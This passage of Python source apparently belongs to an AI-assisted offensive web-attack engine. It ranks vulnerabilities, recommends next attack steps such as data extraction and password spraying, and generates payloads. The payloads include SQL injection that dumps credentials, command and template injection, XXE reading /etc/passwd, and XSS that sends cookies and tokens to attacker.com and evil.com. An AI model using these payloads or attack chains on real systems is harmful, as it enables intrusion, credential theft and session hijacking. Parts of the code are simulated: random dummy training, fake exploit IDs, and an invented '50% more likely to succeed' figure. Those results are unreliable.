                            'published_date': item.get('publishedDate', ''),
                            'last_modified': item.get('lastModifiedDate', '')
                        }
                        
                        term_vulns.append(vuln)
                        vulnerabilities.append(vuln)
                    
                    # Cache results
                    self.cve_cache[term] = term_vulns
                
                # Rate limiting
                await asyncio.sleep(1)
                
            except Exception as e:
                print(f"CVE search failed for {term}: {e}")
                continue
        
        return vulnerabilities
    
    def _extract_cve_description(self, cve_data: Dict) -> str:
        """Extract CVE description"""
        try:
            descriptions = cve_data.get('description', {}).get('description_data', [])
            if descriptions:
                return descriptions[0].get('value', '')[:200]
        except Exception:
            pass
        return ''
    
    def _extract_cvss_score(self, impact: Dict) -> str:
        """Extract CVSS score and severity"""
        try:
            cvss_v3 = impact.get('baseMetricV3', {}).get('cvssV3', {})
            if cvss_v3:
                score = cvss_v3.get('baseScore', 0)
                severity = cvss_v3.get('baseSeverity', 'UNKNOWN')
                return f"{severity} ({score})"
            
            cvss_v2 = impact.get('baseMetricV2', {}).get('cvssV2', {})
            if cvss_v2:
                score = cvss_v2.get('baseScore', 0)
                return f"MEDIUM ({score})"
        except Exception:
            pass
        return 'UNKNOWN'
    
    async def _search_exploit_database(self, technologies: List[str], services: List[Dict]) -> List[Dict[str, Any]]:
        """Search ExploitDB for exploits"""
        vulnerabilities = []
        
        # This would integrate with ExploitDB API or local database
        # For now, simulate with common exploits
        common_exploits = [
            {
                'id': 'EDB-12345',
                'description': 'SQL Injection in login form',
                'severity': 'HIGH (8.5)',
                'source': 'ExploitDB',
                'technology': 'PHP',
                'exploit_available': True
            },
            {
                'id': 'EDB-23456',
                'description': 'Cross-Site Scripting in search parameter',
                'severity': 'MEDIUM (6.1)',
                'source': 'ExploitDB',
                'technology': 'JavaScript',
                'exploit_available': True
            },
            {
                'id': 'EDB-34567',
                'description': 'Remote Code Execution via file upload',
                'severity': 'CRITICAL (9.8)',
                'source': 'ExploitDB',
                'technology': 'Apache',
                'exploit_available': True
            }
        ]
        
        # Filter by technologies found
        for exploit in common_exploits:
            if any(tech.lower() in exploit['technology'].lower() for tech in technologies):
                vulnerabilities.append(exploit)
        
        return vulnerabilities
    
    async def _predict_vulnerabilities(self, target_data: Dict) -> List[Dict[str, Any]]:
        """Use ML to predict likely vulnerabilities"""
        if not self.vulnerability_classifier:
            return []
        
        try:
            # Extract features from target data
            features = self._extract_target_features(target_data)
            
            # Predict vulnerabilities
            predictions = self.vulnerability_classifier.predict(features)
            
            predicted_vulns = []
            for prediction in predictions:
                vuln = {
                    'id': f'AI-{random.randint(1000, 9999)}',
                    'description': prediction['description'],
                    'severity': prediction['severity'],
                    'source': 'AI Prediction',
                    'confidence': prediction['confidence'],
                    'predicted': True
                }
                predicted_vulns.append(vuln)
            
            return predicted_vulns
            
        except Exception as e:
            print(f"Vulnerability prediction failed: {e}")
            return []
    
    def _extract_target_features(self, target_data: Dict) -> np.ndarray:
        """Extract features from target data for ML models"""
        if not ML_AVAILABLE:
            return np.array([])
        
        features = []
        
        # Technology features
        technologies = target_data.get('technologies', [])
        tech_features = [
            'apache' in [t.lower() for t in technologies],
            'nginx' in [t.lower() for t in technologies],
            'php' in [t.lower() for t in technologies],
            'mysql' in [t.lower() for t in technologies],
            'wordpress' in [t.lower() for t in technologies],
            'javascript' in [t.lower() for t in technologies]
        ]
        features.extend([int(f) for f in tech_features])
        
        # Port features
        ports = target_data.get('ports', [])
        port_numbers = [p.get('port', 0) for p in ports]
        port_features = [
            80 in port_numbers,
            443 in port_numbers,
            22 in port_numbers,
            21 in port_numbers,
            3306 in port_numbers,
            5432 in port_numbers
        ]
        features.extend([int(f) for f in port_features])
        
        # Subdomain features
        subdomains = target_data.get('subdomains', [])
        subdomain_features = [
            len(subdomains),
            any('admin' in s.get('subdomain', '') for s in subdomains),
            any('api' in s.get('subdomain', '') for s in subdomains),
            any('dev' in s.get('subdomain', '') for s in subdomains)
        ]
        features.extend(subdomain_features)
        
        return np.array(features).reshape(1, -1)
    
    def _rank_vulnerabilities(self, vulnerabilities: List[Dict], target_data: Dict) -> List[Dict[str, Any]]:
        """Rank vulnerabilities by exploitability and impact"""
        
        for vuln in vulnerabilities:
            score = 0
            
            # Base score from severity
            severity = vuln.get('severity', '').upper()
            if 'CRITICAL' in severity:
                score += 50
            elif 'HIGH' in severity:
                score += 40
            elif 'MEDIUM' in severity:
                score += 25
            elif 'LOW' in severity:
                score += 10
            
            # Boost score for exploits
            if vuln.get('exploit_available', False):
                score += 20
            
            # Boost score for recent vulnerabilities
            pub_date = vuln.get('published_date', '')
            if pub_date:
                try:
                    date_obj = datetime.fromisoformat(pub_date.replace('Z', '+00:00'))
                    days_old = (datetime.now() - date_obj.replace(tzinfo=None)).days
                    if days_old < 30:
                        score += 15
                    elif days_old < 90:
                        score += 10
                except Exception:
                    pass
            
            # Technology match bonus
            technology = vuln.get('technology', '')
            target_techs = target_data.get('technologies', [])
            if any(tech.lower() in technology.lower() for tech in target_techs):
                score += 15
            
            # AI prediction confidence
            if vuln.get('predicted', False):
                confidence = vuln.get('confidence', 0)
                score += confidence * 20
            
            vuln['exploit_score'] = score
        
        # Sort by score
        return sorted(vulnerabilities, key=lambda x: x.get('exploit_score', 0), reverse=True)
    
    async def analyze_attack_results(self, attack_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze attack results and provide AI insights
        """
        analysis = {
            'success_rate': 0,
            'vulnerability_summary': {},
            'attack_effectiveness': {},
            'recommendations': [],
            'next_steps': [],
            'confidence_scores': {}
        }
        
        # Calculate overall success rate
        total_attacks = 0
        successful_attacks = 0
        
        for attack_type, results in attack_results.items():
            if isinstance(results, dict) and 'vulnerable' in results:
                total_attacks += 1
                if results['vulnerable']:
                    successful_attacks += 1
        
        analysis['success_rate'] = successful_attacks / total_attacks if total_attacks > 0 else 0
        
        # Analyze each attack type
        for attack_type, results in attack_results.items():
            if isinstance(results, dict):
                effectiveness = self._analyze_attack_effectiveness(attack_type, results)
                analysis['attack_effectiveness'][attack_type] = effectiveness
        
        # Generate recommendations
        recommendations = self._generate_recommendations(attack_results)
        analysis['recommendations'] = recommendations
        
        # Suggest next steps
        next_steps = self._suggest_next_steps(attack_results)
        analysis['next_steps'] = next_steps
        
        # Learn from results
        await self._learn_from_results(attack_results, analysis)
        
        return analysis
    
    def _analyze_attack_effectiveness(self, attack_type: str, results: Dict) -> Dict[str, Any]:
        """Analyze effectiveness of specific attack type"""
        effectiveness = {
            'success': results.get('vulnerable', False),
            'confidence': 0,
            'impact_assessment': 'low',
            'exploitability': 'low'
        }
        
        # Calculate confidence based on evidence
        if results.get('vulnerable', False):
            vulnerabilities = results.get('vulnerabilities', [])
            if vulnerabilities:
                high_confidence = sum(1 for v in vulnerabilities if v.get('confidence', '').lower() == 'high')
                effectiveness['confidence'] = min(high_confidence / len(vulnerabilities), 1.0)
            else:
                effectiveness['confidence'] = 0.5
        
        # Assess impact
        if attack_type == 'sql_injection':
            effectiveness['impact_assessment'] = 'critical' if results.get('vulnerable') else 'low'
            effectiveness['exploitability'] = 'high' if results.get('vulnerable') else 'low'
        elif attack_type == 'xss':
            effectiveness['impact_assessment'] = 'medium' if results.get('vulnerable') else 'low'
            effectiveness['exploitability'] = 'medium' if results.get('vulnerable') else 'low'
        elif attack_type == 'ssrf':
            effectiveness['impact_assessment'] = 'high' if results.get('vulnerable') else 'low'
            effectiveness['exploitability'] = 'medium' if results.get('vulnerable') else 'low'
        
        return effectiveness
    
    def _generate_recommendations(self, attack_results: Dict) -> List[str]:
        """Generate AI-powered recommendations"""
        recommendations = []
        
        # SQL Injection recommendations
        sql_results = attack_results.get('web_attacks', {}).get('sql_injection', {})
        if sql_results.get('vulnerable', False):
            recommendations.append("Critical: SQL injection found. Immediate manual exploitation recommended.")
            recommendations.append("Run SQLMap for automated data extraction.")
            recommendations.append("Check for privilege escalation opportunities.")
        
        # XSS recommendations
        xss_results = attack_results.get('web_attacks', {}).get('xss', {})
        if xss_results.get('vulnerable', False):
            recommendations.append("XSS vulnerabilities detected. Test for session hijacking.")
            recommendations.append("Check if XSS can be chained with CSRF attacks.")
        
        # Database recommendations
        db_results = attack_results.get('database', {})
        if db_results.get('fingerprint', {}).get('database_type'):
            db_type = db_results['fingerprint']['database_type']
            recommendations.append(f"Database identified as {db_type}. Search for {db_type}-specific exploits.")
        
        # Admin login recommendations
        admin_results = attack_results.get('admin_login', {})
        if admin_results.get('portals', []):
            recommendations.append("Admin portals found. Consider password spraying attacks.")
            recommendations.append("Analyze session tokens for weaknesses.")
        
        # AI-based pattern recommendations
        if self.knowledge_base.get('learned_patterns'):
            pattern_recs = self._generate_pattern_based_recommendations(attack_results)
            recommendations.extend(pattern_recs)
        
        return recommendations[:10]  # Limit to top 10 recommendations
    
    def _suggest_next_steps(self, attack_results: Dict) -> List[str]:
        """Suggest next attack steps based on current results"""
        next_steps = []
        
        # Prioritize based on findings
        if attack_results.get('web_attacks', {}).get('sql_injection', {}).get('vulnerable'):
            next_steps.extend([
                "Enumerate database schema and tables",
                "Extract sensitive user data",
                "Attempt privilege escalation",
                "Look for additional databases"
            ])
        
        if attack_results.get('web_attacks', {}).get('ssrf', {}).get('vulnerable'):
            next_steps.extend([
                "Scan internal network through SSRF",
                "Access cloud metadata services",
                "Attempt to read local files",
                "Chain SSRF with other vulnerabilities"
            ])
        
        if attack_results.get('admin_login', {}).get('portals'):
            next_steps.extend([
                "Perform targeted password attacks",
                "Test for session fixation",
                "Analyze session token entropy",
                "Check for MFA bypass techniques"
            ])
        
        # Add AI-suggested attack chains
        if ML_AVAILABLE and self.attack_sequence_optimizer:
            ai_steps = self.attack_sequence_optimizer.suggest_next_attacks(attack_results)
            next_steps.extend(ai_steps)
        
        return next_steps[:8]  # Limit to top 8 next steps
    
    def _generate_pattern_based_recommendations(self, attack_results: Dict) -> List[str]:
        """Generate recommendations based on learned patterns"""
        recommendations = []
        
        learned_patterns = self.knowledge_base.get('learned_patterns', {})
        
        for pattern_name, pattern_data in learned_patterns.items():
            if self._matches_pattern(attack_results, pattern_data.get('conditions', {})):
                recommendations.extend(pattern_data.get('recommendations', []))
        
        return recommendations
    
    def _matches_pattern(self, attack_results: Dict, conditions: Dict) -> bool:
        """Check if attack results match a learned pattern"""
        for condition_type, condition_value in conditions.items():
            if condition_type == 'technologies':
                target_techs = attack_results.get('reconnaissance', {}).get('technologies', [])
                if not any(tech in target_techs for tech in condition_value):
                    return False
            elif condition_type == 'vulnerable_attacks':
                for attack_name in condition_value:
                    if not attack_results.get('web_attacks', {}).get(attack_name, {}).get('vulnerable'):
                        return False
        
        return True
    
    async def _learn_from_results(self, attack_results: Dict, analysis: Dict):
        """Learn from attack results to improve future attacks"""
        
        # Record successful attacks
        for attack_type, results in attack_results.items():
            if isinstance(results, dict) and results.get('vulnerable', False):
                success_record = {
                    'attack_type': attack_type,
                    'timestamp': datetime.now().isoformat(),
                    'target_info': attack_results.get('reconnaissance', {}),
                    'success_indicators': results.get('vulnerabilities', []),
                    'confidence': analysis.get('attack_effectiveness', {}).get(attack_type, {}).get('confidence', 0)
                }
                self.knowledge_base['successful_attacks'].append(success_record)
        
        # Update payload effectiveness
        for attack_type, results in attack_results.items():
            if isinstance(results, dict) and 'vulnerabilities' in results:
                for vuln in results['vulnerabilities']:
                    payload = vuln.get('payload', '')
                    if payload:
                        if payload not in self.knowledge_base['payload_effectiveness']:
                            self.knowledge_base['payload_effectiveness'][payload] = {
                                'success_count': 0,
                                'total_count': 0,
                                'attack_type': attack_type
                            }
                        
                        self.knowledge_base['payload_effectiveness'][payload]['total_count'] += 1
                        if vuln.get('confidence', '').lower() == 'high':
                            self.knowledge_base['payload_effectiveness'][payload]['success_count'] += 1
        
        # Learn attack patterns
        if analysis.get('success_rate', 0) > 0.5:  # If overall attack was successful
            pattern = {
                'conditions': {
                    'technologies': attack_results.get('reconnaissance', {}).get('technologies', []),
                    'vulnerable_attacks': [
                        attack for attack, results in attack_results.items()
                        if isinstance(results, dict) and results.get('vulnerable', False)
                    ]
                },
                'recommendations': analysis.get('recommendations', []),
                'success_rate': analysis.get('success_rate', 0),
                'learned_at': datetime.now().isoformat()
            }
            
            pattern_key = hashlib.md5(str(pattern['conditions']).encode()).hexdigest()[:8]
            self.knowledge_base['learned_patterns'][pattern_key] = pattern
        
        # Limit knowledge base size
        if len(self.knowledge_base['successful_attacks']) > 1000:
            self.knowledge_base['successful_attacks'] = self.knowledge_base['successful_attacks'][-500:]
        
        # Save learned knowledge
        self._save_knowledge_base()
    
    async def generate_custom_payloads(self, attack_results: Dict) -> Dict[str, List[str]]:
        """
        Generate custom payloads based on target analysis and AI
        """
        custom_payloads = {
            'sql_injection': [],
            'xss': [],
            'ssrf': [],
            'ssti': [],
            'command_injection': []
        }
        
        # Extract target information
        target_info = attack_results.get('reconnaissance', {})
        technologies = target_info.get('technologies', [])
        
        # Generate technology-specific payloads
        for tech in technologies:
            tech_payloads = self._generate_tech_specific_payloads(tech)
            for attack_type, payloads in tech_payloads.items():
                if attack_type in custom_payloads:
                    custom_payloads[attack_type].extend(payloads)
        
        # Use ML-based payload generation if available
        if ML_AVAILABLE and self.payload_generator:
            ml_payloads = await self._generate_ml_payloads(attack_results)
            for attack_type, payloads in ml_payloads.items():
                if attack_type in custom_payloads:
                    custom_payloads[attack_type].extend(payloads)
        
        # Generate payloads based on successful patterns
        pattern_payloads = self._generate_pattern_based_payloads(attack_results)
        for attack_type, payloads in pattern_payloads.items():
            if attack_type in custom_payloads:
                custom_payloads[attack_type].extend(payloads)
        
        # Remove duplicates and limit payloads
        for attack_type in custom_payloads:
            custom_payloads[attack_type] = list(set(custom_payloads[attack_type]))[:20]
        
        return custom_payloads
    
    def _generate_tech_specific_payloads(self, technology: str) -> Dict[str, List[str]]:
        """Generate payloads specific to detected technology"""
        payloads = {
            'sql_injection': [],
            'xss': [],
            'ssrf': [],
            'ssti': [],
            'command_injection': []
        }
        
        tech = technology.lower()
        
        if 'mysql' in tech:
            payloads['sql_injection'].extend([
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION SELECT schema_name FROM information_schema.schemata--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--"
            ])
        
        if 'postgresql' in tech or 'postgres' in tech:
            payloads['sql_injection'].extend([
                "' AND pg_sleep(5)--",
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT version()--"
            ])
        
        if 'php' in tech:
            payloads['command_injection'].extend([
                "; system('id');",
                "| php -r 'system(\"id\");'",
                "&& php -r 'phpinfo();'"
            ])
            payloads['ssti'].extend([
                "{{7*7}}",
                "{{system('id')}}",
                "{{phpinfo()}}"
            ])
        
        if 'python' in tech or 'django' in tech or 'flask' in tech:
            payloads['ssti'].extend([
                "{{config}}",
                "{{request.environ}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ])
        
        if 'apache' in tech:
            payloads['ssrf'].extend([
                "http://localhost/server-status",
                "http://127.0.0.1/server-info",
                "file:///etc/apache2/apache2.conf"
            ])
        
        if 'wordpress' in tech:
            payloads['sql_injection'].extend([
                "') UNION SELECT user_login,user_pass FROM wp_users--",
                "' AND (SELECT * FROM wp_options WHERE option_name='admin_email')--"
            ])
        
        return payloads
    
    async def _generate_ml_payloads(self, attack_results: Dict) -> Dict[str, List[str]]:
        """Generate payloads using machine learning models"""
        if not self.payload_generator:
            return {}
        
        try:
            return await self.payload_generator.generate_payloads(attack_results)
        except Exception as e:
            print(f"ML payload generation failed: {e}")
            return {}
    
    def _generate_pattern_based_payloads(self, attack_results: Dict) -> Dict[str, List[str]]:
        """Generate payloads based on learned successful patterns"""
        payloads = {
            'sql_injection': [],
            'xss': [],
            'ssrf': [],
            'ssti': [],
            'command_injection': []
        }
        
        # Use successful payloads from knowledge base
        payload_effectiveness = self.knowledge_base.get('payload_effectiveness', {})
        
        for payload, stats in payload_effectiveness.items():
            success_rate = stats['success_count'] / max(stats['total_count'], 1)
            if success_rate > 0.3:  # If payload has >30% success rate
                attack_type = stats.get('attack_type', 'sql_injection')
                if attack_type in payloads:
                    payloads[attack_type].append(payload)
        
        return payloads
    
    async def adaptive_retest(self, attack_results: Dict, target_url: str) -> Dict[str, Any]:
        """
        Perform adaptive retesting of failed attacks with improved payloads
        """
        retest_results = {
            'retested_attacks': [],
            'new_vulnerabilities': [],
            'improved_success_rate': 0,
            'adaptive_payloads': []
        }
        
        # Identify failed attacks to retest
        failed_attacks = []
        for attack_type, results in attack_results.get('web_attacks', {}).items():
            if isinstance(results, dict) and not results.get('vulnerable', False):
                failed_attacks.append(attack_type)
        
        # Generate improved payloads for failed attacks
        improved_payloads = await self.generate_custom_payloads(attack_results)
        
        # Simulate retesting (in practice, this would call actual attack engines)
        for attack_type in failed_attacks:
            if attack_type in improved_payloads:
                payloads = improved_payloads[attack_type]
                
                # Simulate improved attack with AI-generated payloads
                retest_result = await self._simulate_adaptive_attack(attack_type, payloads, target_url)
                
                if retest_result['success']:
                    retest_results['new_vulnerabilities'].append(retest_result)
                
                retest_results['retested_attacks'].append({
                    'attack_type': attack_type,
                    'payloads_used': len(payloads),
                    'success': retest_result['success']
                })
        
        # Calculate improvement
        original_success = len([
            a for a in attack_results.get('web_attacks', {}).values()
            if isinstance(a, dict) and a.get('vulnerable', False)
        ])
        
        new_success = len(retest_results['new_vulnerabilities'])
        total_attacks = len(attack_results.get('web_attacks', {}))
        
        if total_attacks > 0:
            original_rate = original_success / total_attacks
            improved_rate = (original_success + new_success) / total_attacks
            retest_results['improved_success_rate'] = improved_rate - original_rate
        
        return retest_results
    
    async def _simulate_adaptive_attack(self, attack_type: str, payloads: List[str], target_url: str) -> Dict[str, Any]:
        """Simulate adaptive attack with improved payloads"""
        
        # This is a simulation - in practice, this would use the actual attack engines
        # with the improved payloads
        
        result = {
            'attack_type': attack_type,
            'success': False,
            'payload_used': '',
            'confidence': 'medium'
        }
        
        # Simulate improved success rate based on AI analysis
        base_success_probability = {
            'sql_injection': 0.3,
            'xss': 0.4,
            'ssrf': 0.2,
            'ssti': 0.15,
            'command_injection': 0.25
        }
        
        # AI improvement factor
        improvement_factor = 1.5  # AI payloads are 50% more likely to succeed
        
        success_prob = base_success_probability.get(attack_type, 0.2) * improvement_factor
        
        if random.random() < success_prob:
            result['success'] = True
            result['payload_used'] = random.choice(payloads) if payloads else 'AI-generated'
            result['confidence'] = 'high'
        
        return result

    async def update_learning_model(self, attack_results: List[Dict[str, Any]]):
        """
        Update ML models based on attack results (if ML is available)
        """
        if not ML_AVAILABLE:
            await self._log_thinking("📚 Storing attack patterns for future learning (ML libraries not available)")
            # Store results for manual pattern analysis
            for result in attack_results:
                attack_type = result.get('attack_type', 'unknown')
                success = result.get('success', False)
                target_characteristics = result.get('target_characteristics', {})
                
                if attack_type not in self.attack_patterns:
                    self.attack_patterns[attack_type] = {
                        'success_count': 0,
                        'failure_count': 0,
                        'success_indicators': [],
                        'failure_indicators': [],
                        'target_patterns': []
                    }
                
                pattern = self.attack_patterns[attack_type]
                if success:
                    pattern['success_count'] += 1
                    pattern['success_indicators'].extend(result.get('success_indicators', []))
                else:
                    pattern['failure_count'] += 1
                    pattern['failure_indicators'].extend(result.get('failure_indicators', []))
                
                pattern['target_patterns'].append(target_characteristics)
        else:
            await self._log_thinking("🤖 Updating ML models with new attack data...")
            # Update ML models if available
            if hasattr(self, 'attack_success_model'):
                # Prepare training data
                features = []
                labels = []
                
                for result in attack_results:
                    feature_vector = self._extract_features(result)
                    label = 1 if result.get('success', False) else 0
                    features.append(feature_vector)
                    labels.append(label)
                
                # Incremental learning (if supported by the model)
                if hasattr(self.attack_success_model, 'partial_fit'):
                    import numpy as np
                    self.attack_success_model.partial_fit(np.array(features), np.array(labels))
                    await self._log_thinking("✅ ML model updated with incremental learning")
    
    def _extract_features(self, attack_result: Dict[str, Any]) -> List[float]:
        """
        Extract numerical features from attack result for ML training
        """
        features = []
        
        # Attack type features (one-hot encoding)
        attack_types = ['sql_injection', 'xss', 'ssrf', 'ssti', 'command_injection', 'file_inclusion']
        attack_type = attack_result.get('attack_type', '')
        for atype in attack_types:
            features.append(1.0 if attack_type == atype else 0.0)
        
        # Target characteristics
        target_chars = attack_result.get('target_characteristics', {})
        features.extend([
            target_chars.get('response_time', 0) / 1000,  # Normalize response time
            len(target_chars.get('technologies', [])) / 10,  # Normalize tech count
            target_chars.get('port_count', 0) / 100,  # Normalize port count
            1.0 if target_chars.get('has_waf', False) else 0.0,  # WAF presence
            target_chars.get('complexity_score', 0) / 100,  # Complexity score
        ])
        
        # Payload characteristics
        payload = attack_result.get('payload', '')
        features.extend([
            len(payload) / 1000,  # Payload length
            payload.count("'") / 10,  # Quote count
            payload.count('<') / 10,  # Tag count
            1.0 if 'UNION' in payload.upper() else 0.0,  # SQL union presence
            1.0 if 'script' in payload.lower() else 0.0,  # Script tag presence
        ])
        
        return features

    async def get_next_attack_recommendation(self, current_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Get AI recommendation for next attack based on current results
        """
        self.thinking_state = "recommending"
        await self._log_thinking("🎯 Analyzing current results and recommending next attack vector...")
        
        recommendation = {
            'recommended_phase': None,
            'priority_level': 'medium',
            'estimated_success': 0.5,
            'reasoning': '',
            'custom_payloads': []
        }
        
        # Analyze successful attacks for chaining opportunities
        successful_attacks = []
        for phase, results in current_results.items():
            if isinstance(results, dict) and results.get('vulnerable', False):
                successful_attacks.append(phase)
        
        if 'web_attacks' in successful_attacks:
            if current_results['web_attacks'].get('sql_injection', {}).get('vulnerable'):
                recommendation.update({
                    'recommended_phase': 'database_exploitation',
                    'priority_level': 'high',
                    'estimated_success': 0.8,
                    'reasoning': 'SQL injection found - high probability of database access',
                    'custom_payloads': await self._generate_db_exploitation_payloads(current_results)
                })
            elif current_results['web_attacks'].get('xss', {}).get('vulnerable'):
                recommendation.update({
                    'recommended_phase': 'session_hijacking',
                    'priority_level': 'medium',
                    'estimated_success': 0.6,
                    'reasoning': 'XSS found - session hijacking opportunity',
                    'custom_payloads': await self._generate_session_hijack_payloads()
                })
        
        if not successful_attacks:
            # No successful attacks yet - recommend different approach
            failed_phases = [phase for phase, results in current_results.items() 
                           if isinstance(results, dict) and not results.get('vulnerable', True)]
            
            if len(failed_phases) >= 2:
                recommendation.update({
                    'recommended_phase': 'alternative_vectors',
                    'priority_level': 'high',
                    'estimated_success': 0.4,
                    'reasoning': 'Multiple attack vectors failed - trying alternative approaches',
                    'custom_payloads': await self._generate_alternative_payloads(current_results)
                })
        
        await self._log_thinking(f"💡 Recommendation: {recommendation['recommended_phase']} ({recommendation['priority_level']} priority)")
        
        return recommendation
    
    async def _generate_db_exploitation_payloads(self, results: Dict[str, Any]) -> List[str]:
        """Generate database exploitation payloads based on SQL injection results"""
        payloads = []
        
        sql_results = results.get('web_attacks', {}).get('sql_injection', {})
        if sql_results.get('vulnerable'):
            # Extract database type from successful injection
            for vuln in sql_results.get('vulnerabilities', []):
                payload = vuln.get('payload', '')
                if 'mysql' in payload.lower():
                    payloads.extend([
                        "' UNION SELECT schema_name FROM information_schema.schemata--",
                        "' UNION SELECT table_name FROM information_schema.tables--",
                        "' UNION SELECT user,password FROM mysql.user--"
                    ])
                elif 'postgresql' in payload.lower():
                    payloads.extend([
                        "'; SELECT datname FROM pg_database--",
                        "'; SELECT tablename FROM pg_tables--",
                        "'; SELECT usename FROM pg_user--"
                    ])
        
        return payloads
    
    async def _generate_session_hijack_payloads(self) -> List[str]:
        """Generate session hijacking payloads"""
        return [
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://attacker.com/session?data='+localStorage.getItem('token'))>",
            "<script>fetch('http://attacker.com/hijack', {method:'POST', body:document.cookie})</script>"
        ]
    
    async def _generate_alternative_payloads(self, results: Dict[str, Any]) -> List[str]:
        """Generate alternative attack payloads when standard attacks fail"""
        alternative_payloads = [
            # Alternative SQL injection techniques
            "'; WAITFOR DELAY '00:00:05'--",  # Time-based blind SQL injection
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",  # MSSQL specific
            "' OR pg_sleep(5)--",  # PostgreSQL time delay
            
            # Alternative XSS techniques
            "<details open ontoggle=alert(1)>",  # HTML5 XSS
            "<marquee onstart=alert(1)>",  # Marquee XSS
            "javascript:alert(document.domain)//",  # JavaScript protocol
            
            # NoSQL injection
            "'; return true; var x='",  # MongoDB injection
            "[$ne]=1",  # NoSQL not equal
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",  # LDAP wildcard injection
            
            # XML injection
            "<?xml version='1.0'?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            
            # Template injection alternatives
            "${7*7}",  # JSTL expression
            "#{7*7}",  # JSF expression
            "{{constructor.constructor('alert(1)')()}}",  # AngularJS sandbox escape
        ]
        
        return alternative_payloads


# ML Model Classes (if ML libraries are available)
if ML_AVAILABLE:
    
    class PayloadGenerator:
        """ML-based payload generator"""
        
        def __init__(self):
            self.model = None
            self.tokenizer = None
            self._initialize_model()
        
        def _initialize_model(self):
            """Initialize payload generation model"""
            try:
                # In practice, this would load a fine-tuned model
                # For now, use a simple approach
                self.payload_templates = {
                    'sql_injection': [
                        "' OR {condition}--",
                        "' UNION SELECT {columns}--",
                        "'; {command}--"
                    ],
                    'xss': [
                        "<script>{code}</script>",
                        "<img src=x onerror={code}>",
                        "javascript:{code}"
                    ]
                }
            except Exception as e:
                print(f"Failed to initialize payload generator: {e}")
        
        async def generate_payloads(self, attack_results: Dict) -> Dict[str, List[str]]:
            """Generate custom payloads based on target analysis"""
            payloads = {}
            
            # Extract target characteristics
            technologies = attack_results.get('reconnaissance', {}).get('technologies', [])
            
            # Generate SQL injection payloads
            sql_payloads = []
            for template in self.payload_templates.get('sql_injection', []):
                if 'mysql' in [t.lower() for t in technologies]:
                    sql_payloads.append(template.format(condition="1=1", columns="version(),user(),database()"))
                elif 'postgresql' in [t.lower() for t in technologies]:
                    sql_payloads.append(template.format(condition="1=1", columns="version()"))
                else:
                    sql_payloads.append(template.format(condition="1=1", columns="1,2,3"))
            
            payloads['sql_injection'] = sql_payloads
            
            # Generate XSS payloads
            xss_payloads = []
            for template in self.payload_templates.get('xss', []):
                xss_payloads.append(template.format(code="alert('XSS')"))
                xss_payloads.append(template.format(code="document.location='http://evil.com?'+document.cookie"))
            
            payloads['xss'] = xss_payloads
            
            return payloads
    
    class VulnerabilityClassifier:
        """ML-based vulnerability classifier"""
        
        def __init__(self):
            self.model = None
            self._initialize_model()
        
        def _initialize_model(self):
            """Initialize vulnerability classification model"""
            try:
                # In practice, this would load a trained model
                self.model = RandomForestClassifier(n_estimators=100, random_state=42)
                # For demonstration, create dummy training data
                self._train_dummy_model()
            except Exception as e:
                print(f"Failed to initialize vulnerability classifier: {e}")
        
        def _train_dummy_model(self):
            """Train with dummy data for demonstration"""
            # Create dummy training data
            X = np.random.rand(100, 16)  # 16 features
            y = np.random.choice(['sql_injection', 'xss', 'ssrf', 'none'], 100)
            
            self.model.fit(X, y)
        
        def predict(self, features: np.ndarray) -> List[Dict[str, Any]]:
            """Predict vulnerabilities based on target features"""
            if self.model is None:
                return []
            
            try:
                predictions = self.model.predict_proba(features)
                classes = self.model.classes_
                
                results = []
                for i, class_name in enumerate(classes):
                    if class_name != 'none' and predictions[0][i] > 0.3:
                        results.append({
                            'type': class_name,
                            'description': f'AI-predicted {class_name} vulnerability',
                            'confidence': predictions[0][i],
                            'severity': 'MEDIUM' if predictions[0][i] > 0.5 else 'LOW'
                        })
                
                return results
            
            except Exception as e:
                print(f"Vulnerability prediction failed: {e}")
                return []
    
    class AttackSequenceOptimizer:
        """ML-based attack sequence optimizer"""
        
        def __init__(self):
            self.attack_chains = [
                ['reconnaissance', 'web_attacks', 'database', 'admin_login'],
                ['reconnaissance', 'admin_login', 'web_attacks', 'database'],
                ['reconnaissance', 'web_attacks', 'admin_login', 'database']
            ]
        
        def suggest_next_attacks(self, current_results: Dict) -> List[str]:
            """Suggest next attacks based on current results"""
            suggestions = []
            
            # If SQL injection found, suggest database exploitation
            if current_results.get('web_attacks', {}).get('sql_injection', {}).get('vulnerable'):
                suggestions.extend([
                    "Enumerate database tables and columns",
                    "Extract user credentials from database",
                    "Look for admin/sensitive tables"
                ])
            
            # If admin portals found, suggest credential attacks
            if current_results.get('admin_login', {}).get('portals'):
                suggestions.extend([
                    "Test default credentials on admin portals",
                    "Perform password spraying attacks",
                    "Analyze session management"
                ])
            
            return suggestions[:5]  # Return top 5 suggestions
    
    async def integrate_with_coordination_manager(self):
        """
        Integration method for AI Coordination Manager
        Provides access to AI thinking capabilities for coordinated attacks
        """
        return {
            'ai_thinking_model': self,
            'mission_planning': self.think_and_plan,
            'vulnerability_search': self.search_vulnerabilities,
            'payload_generation': self.generate_custom_payloads,
            'thinking_state': self.thinking_state,
            'current_mission': getattr(self, 'current_mission', None),
            'learning_history': self.learning_history,
            'adaptation_metrics': {
                'total_adaptations': len(self.learning_history),
                'success_rate': self._calculate_success_rate(),
                'learning_enabled': ML_AVAILABLE
            }
        }
    
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate from learning history"""
        if not self.learning_history:
            return 0.0
        
        successful = sum(1 for entry in self.learning_history if entry.get('success', False))
        return successful / len(self.learning_history)

else:
    # Dummy classes if ML libraries not available
    class PayloadGenerator:
        def __init__(self): pass
        async def generate_payloads(self, attack_results): return {}
    
    class VulnerabilityClassifier:
        def __init__(self): pass
        def predict(self, features): return []
    
    class AttackSequenceOptimizer:
        def __init__(self): pass
        def suggest_next_attacks(self, current_results): return []


# Test function
async def main():
    """Test the AI core engine"""
    ai_core = AIAdaptiveCore()
    
    # Test vulnerability search
